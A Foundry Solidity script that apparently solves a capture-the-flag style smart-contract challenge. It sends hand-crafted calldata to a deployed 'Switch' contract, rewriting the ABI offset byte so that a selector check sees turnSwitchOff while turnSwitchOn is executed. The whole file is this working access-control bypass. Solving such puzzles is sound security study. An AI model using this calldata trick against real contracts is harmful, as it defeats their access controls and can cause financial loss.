// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

import {Switch} from "../src/Switch.sol";

contract SwitchScript is Script {
    function run() public {
        vm.startBroadcast();

        Switch _switch = Switch(0x4A67C43eE7A5F3BB669b6d0399222E6A6DDd8a68);

        bytes memory turnSwitchOnCallData = abi.encodeWithSignature("turnSwitchOn()");
        bytes memory turnSwitchOffCallData = abi.encodeWithSignature("turnSwitchOff()");
        bytes memory flipSwitchCallData = abi.encodePacked(
            abi.encodeWithSignature("flipSwitch(bytes)", turnSwitchOffCallData),
            abi.encode(turnSwitchOnCallData)
        );

        flipSwitchCallData[35] = 0x80;

        address(_switch).call(flipSwitchCallData);

        console.log(_switch.switchOn());

        vm.stopBroadcast();
    }
}